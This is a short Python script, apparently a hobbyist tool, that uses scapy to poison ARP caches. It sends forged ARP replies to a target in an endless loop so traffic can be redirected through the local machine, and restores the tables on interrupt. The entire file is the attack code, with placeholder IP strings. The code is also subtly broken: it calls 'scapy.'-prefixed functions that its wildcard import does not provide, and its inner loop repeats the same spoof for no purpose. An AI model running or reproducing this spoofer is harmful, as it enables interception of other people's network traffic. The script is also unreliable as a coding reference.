#arpSpoofer.py: This Python script attempts to spoof ARP packets. The script will get the MAC address
#of the target IP address and attempt to send a packet from the local machine spoofed as the spoofed
#IP address. If the user interrupts the program while it is executing, the script will restore the ARP
#tables back to their original state.
#!/usr/bin/python

from scapy.all import *

def restore(dstIP, srcIP):
    dstMAC = getTargetMac(dstIP)
    srcMAC = getTargetMac(srcIP)
    packet = scapy.ARP(op=2, pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    scapy.send(packet, verbose=False)
    return

def getTargetMac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalPacket = broadcast/arp_request
    answer = scapy.srp(finalPacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)


def spoof_arp(target_ip, spoofed_ip):
    mac = getTargetMac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)
    return

def main():
    try:
        while True:
            for i in range (1, 255):
                spoof_arp("Target_IP", "Source_IP")
    except KeyboardInterrupt:
        print("[!] Program Interrupted")
        restore("Target_IP", "Source_IP")
        exit(0)

main()
